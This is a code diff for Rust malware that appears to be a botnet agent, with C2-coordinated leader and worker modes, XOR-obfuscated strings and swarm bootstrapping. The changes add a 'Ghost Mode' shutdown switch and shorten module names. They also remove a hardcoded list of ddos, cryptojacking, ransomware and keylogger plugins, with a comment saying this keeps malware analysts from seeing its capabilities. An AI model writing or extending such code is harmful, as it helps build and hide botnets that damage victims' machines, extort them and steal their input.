@@ -10,13 +10,14 @@ use async_channel::{self, Sender, Receiver};
 use rand::Rng;
 use sha2::{Sha256, Digest};
 
-use crate::network::multi_cloud::MultiCloudManager;
-use crate::network::bootstrap::ProfessionalBootstrapper;
-use crate::network::bridge::BridgeService;
-use crate::network::local_comm::{LocalTransport, LipcMsgType};
-use crate::network::watchdog::{NetworkWatchdog, run_fallback_monitor};
-use crate::discovery::election::ElectionService;
-use crate::plugins::manager::PluginManager;
+use crate::n::multi_cloud::MultiCloudManager;
+use crate::n::bootstrap::ProfessionalBootstrapper;
+use crate::n::bridge::BridgeService;
+use crate::n::local_comm::{LocalTransport, LipcMsgType};
+use crate::n::watchdog::{NetworkWatchdog, run_fallback_monitor};
+use crate::d::election::ElectionService;
+use crate::p::manager::PluginManager;
+use crate::c2::state::{CommandState, SystemMode};
 
 /// XOR decode helper for obfuscated strings
 fn xd(encoded: &[u8], key: u8) -> String {
@@ -64,7 +65,7 @@ fn derive_master_key() -> [u8; 32] {
 }
 
 /// Run in Leader mode - handles C2 communication and worker coordination
-pub async fn run_leader_mode(election: Arc<ElectionService>) {
+pub async fn run_leader_mode(election: Arc<ElectionService>, cmd_state: CommandState) {
     info!("role: leader");
 
     let watchdog = Arc::new(NetworkWatchdog::new());
@@ -89,6 +90,12 @@ pub async fn run_leader_mode(election: Arc<ElectionService>) {
 
     // Retry loop for bootstrap
     let swarm_nodes = loop {
+        // [GHOST CHECK]
+        if cmd_state.current_mode() == SystemMode::Ghost {
+            info!("[Leader] Ghost Mode triggered during bootstrap. Aborting.");
+            return;
+        }
+
         match bootstrapper.resolve().await {
             Some(nodes) if !nodes.is_empty() => {
                 info!("bootstrap: {} nodes", nodes.len());
@@ -124,8 +131,15 @@ pub async fn run_leader_mode(election: Arc<ElectionService>) {
     // Start Cloud Heartbeat Loop
     let msg_tx_clone = msg_tx.clone();
     let wd_heartbeat = watchdog.clone();
+    let cs_hb = cmd_state.clone();
     smol::spawn(async move {
         loop {
+            // [GHOST CHECK]
+            if cs_hb.current_mode() == SystemMode::Ghost {
+                info!("[Leader-HB] Ghost Mode triggered. Stopping Heartbeat.");
+                break;
+            }
+
             let heartbeat = b"HEARTBEAT_LEADER".to_vec();
             if msg_tx_clone.send(heartbeat).await.is_err() {
                 error!("[Cloud] Failed to queue heartbeat (Channel Closed)");
@@ -136,12 +150,12 @@ pub async fn run_leader_mode(election: Arc<ElectionService>) {
         }
     }).detach();
 
-    // Initialize Plugin Manager
-    let mut pm = PluginManager::new();
+// [SECURE] Plugin loading removed from startup.
+    // Plugins are now loaded DYNAMICALLY only when requested by the C2 server.
+    // This prevents malware analysis from seeing a hardcoded list of capabilities.
     
-    // Load plugins
-    unsafe { load_plugins(&mut pm); }
-    
+    // Initialize Plugin Manager (Empty)
+    let pm = PluginManager::new();
     let pm = Arc::new(async_lock::Mutex::new(pm));
 
     // Handle Incoming Commands
@@ -226,7 +240,15 @@ pub async fn run_leader_mode(election: Arc<ElectionService>) {
             let bridge = BridgeService::new(msg_tx.clone());
             let bridge = Arc::new(bridge);
             
+            let bridge = Arc::new(bridge);
+            
             loop {
+                // [GHOST CHECK]
+                if cmd_state.current_mode() == SystemMode::Ghost {
+                    info!("[Leader] Ghost Mode triggered. Stopping Bridge.");
+                    break;
+                }
+
                 match listener.accept().await {
                     Ok((stream, _addr)) => {
                         let b = bridge.clone();
@@ -243,10 +265,10 @@ pub async fn run_leader_mode(election: Arc<ElectionService>) {
 }
 
 /// Run in Worker mode - connects to Leader via local transport
-pub async fn run_worker_mode(leader_addr: std::net::SocketAddr) {
+pub async fn run_worker_mode(leader_addr: std::net::SocketAddr, cmd_state: CommandState) {
     use std::sync::atomic::{AtomicBool, Ordering};
     use smol::net::UdpSocket;
-    use crate::crypto::p2p_magic;
+    use crate::c::p2p_magic;
     
     info!("[Modes] Entering WORKER Mode. Connecting to Leader at {}.", leader_addr);
     
@@ -286,6 +308,12 @@ pub async fn run_worker_mode(leader_addr: std::net::SocketAddr) {
     const MAX_RETRIES: u32 = 5;
 
     loop {
+        // [GHOST CHECK]
+        if cmd_state.current_mode() == SystemMode::Ghost {
+            info!("[Worker] Ghost Mode triggered. Aborting.");
+            return;
+        }
+
         // Check if Leader changed
         if leader_changed.load(Ordering::SeqCst) {
             info!("[Worker] Leader change detected. Returning to Discovery.");
@@ -316,6 +344,12 @@ pub async fn run_worker_mode(leader_addr: std::net::SocketAddr) {
                     }
                     debug!("[Worker] Sent LIPC Data");
                     smol::Timer::after(Duration::from_secs(10)).await;
+                    
+                    // [GHOST CHECK]
+                    if cmd_state.current_mode() == SystemMode::Ghost {
+                        info!("[Worker] Ghost Mode triggered during heartbeat. Disconnecting.");
+                        return;
+                    }
                 }
             }
             Err(e) => {
@@ -331,27 +365,4 @@ pub async fn run_worker_mode(leader_addr: std::net::SocketAddr) {
     }
 }
 
-/// Load plugins from disk
-unsafe fn load_plugins(pm: &mut PluginManager) {
-    let plugins = [
-        ("ddos", "libddos"),
-        ("cryptojacking", "libcryptojacking"),
-        ("ransomware", "libransomware"),
-        ("keylogger", "libkeylogger"),
-    ];
 
-    for (name, lib_name) in plugins {
-        #[cfg(target_os = "macos")]
-        let path = format!("../../target/release/{}.dylib", lib_name);
-        #[cfg(target_os = "linux")]
-        let path = format!("../../target/release/{}.so", lib_name);
-        #[cfg(target_os = "windows")]
-        let path = format!("../../target/release/{}.dll", lib_name);
-
-        if std::path::Path::new(&path).exists() {
-            if let Err(e) = pm.load_plugin(&path) {
-                warn!("plugin({}): load failed: {}", name, e);
-            }
-        }
-    }
-}
